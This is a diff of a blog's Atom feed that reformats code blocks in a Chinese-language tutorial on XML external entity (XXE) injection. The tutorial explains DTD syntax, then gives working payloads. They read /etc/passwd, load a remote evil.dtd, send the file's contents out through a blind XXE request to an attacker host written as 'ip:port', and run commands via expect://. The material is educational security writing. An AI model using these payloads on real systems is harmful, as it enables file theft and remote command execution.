@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://localhost:4000</id>
     <title>outlaws&apos; blog</title>
-    <updated>2021-03-19T02:47:54.918Z</updated>
+    <updated>2021-03-19T03:18:58.315Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://localhost:4000"/>
     <link rel="self" href="http://localhost:4000/atom.xml"/>
@@ -40,20 +40,30 @@
 <p>1内部DTD：即对XML文档的元素、属性和实体的DTD的声明都在xml文档中。</p>
 <p>2外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件(.dtd)中。</p>
 <h2 id="内部的doctype">内部的DOCTYPE</h2>
-<pre><code class="language-xml-dtd">&lt;!DOCTYPE 根元素 [元素声明]&gt;
+<pre><code>
+&lt;!DOCTYPE 根元素 [元素声明]&gt;
+
 </code></pre>
 <h2 id="外部的文档声明">外部的文档声明</h2>
-<pre><code class="language-xml-dtd">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;
+<pre><code>
+&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;
+
 </code></pre>
 <h1 id="dtd实体">DTD实体</h1>
 <h2 id="内部实体声明">内部实体声明</h2>
-<pre><code class="language-xml-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;
+<pre><code>
+&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;
+
 </code></pre>
 <h2 id="外部实体声明">外部实体声明</h2>
-<pre><code class="language-xml-dtd">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;
+<pre><code>
+&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;
+
 </code></pre>
 <h2 id="参数实体声明">参数实体声明</h2>
-<pre><code class="language-xml-dtd">&lt;!ENTITY %实体名称 &quot;实体的值&quot;&gt;
+<pre><code>
+&lt;!ENTITY %实体名称 &quot;实体的值&quot;&gt;
+
 </code></pre>
 <h1 id="xxe分类">XXE分类</h1>
 <p>按照构造外部实体声明的方法不同</p>
@@ -66,7 +76,8 @@
 <p>3.Blind XXE</p>
 <h1 id="怎样利用">怎样利用</h1>
 <h2 id="1直接通过dtd外部实体声明">1.直接通过DTD外部实体声明</h2>
-<pre><code class="language-xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+<pre><code>
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
 &lt;!DOCTYPE xxe[
     &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;
     ]&gt;
@@ -78,17 +89,21 @@ eg:
     &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;
     ]&gt;
 &lt;user&gt;&lt;username&gt;&amp;f;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
+
 </code></pre>
 <h2 id="2通过dtd文档引入外部dtd文档的外部实体声明">2.通过dtd文档引入外部dtd文档的外部实体声明</h2>
-<pre><code class="language-xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;
+<pre><code>
+&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE xxe SYSTEM &quot;http://ip:port/evil.dtd&quot;&gt;
 &lt;a&gt;&amp;b;&lt;/a&gt;
 
 #其中的evil.dtd内容如下
 &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
+
 </code></pre>
 <h2 id="3通过dtd外部实体声明引入外部dtd文档中的外部实体声明">3.通过dtd外部实体声明引入外部dtd文档中的外部实体声明</h2>
-<pre><code class="language-xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;
+<pre><code>
+&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE xxe [
     &lt;!ENTITY % file SYSTEM &quot;http://ip:port/evil.dtd&quot;&gt;
         %file;
@@ -97,10 +112,12 @@ eg:
 
 #其中的evil.dtd内容如下
 &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
+
 </code></pre>
 <h2 id="4blind-xxe">4.Blind XXE</h2>
 <p>其实就是无法回显，将数据发送至vps</p>
-<pre><code class="language-xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+<pre><code>
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
 &lt;!DOCTYPE root [
     &lt;!ENTITY %remote SYSTEM &quot;http://ip:port/owen.dtd&quot;&gt;
         %remote;
@@ -112,16 +129,19 @@ eg:
 &lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:port/?file=%file;'&gt;&quot;&gt;
 %int;
 %send;
+
 </code></pre>
 <h1 id="利用方式">利用方式</h1>
 <p>1.读文件</p>
 <p>见怎样利用</p>
 <p>2.执行系统命令</p>
 <p>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p>
-<pre><code class="language-xml-dtd">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;
+<pre><code>
+&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;
 &lt;dir&gt;
 &lt;file&gt;&amp;cmd;&lt;/file&gt;
 &lt;/dir&gt;
+
 </code></pre>
 <p>3.http内网主机探测</p>
 <p>4.内网主机端口扫描</p>
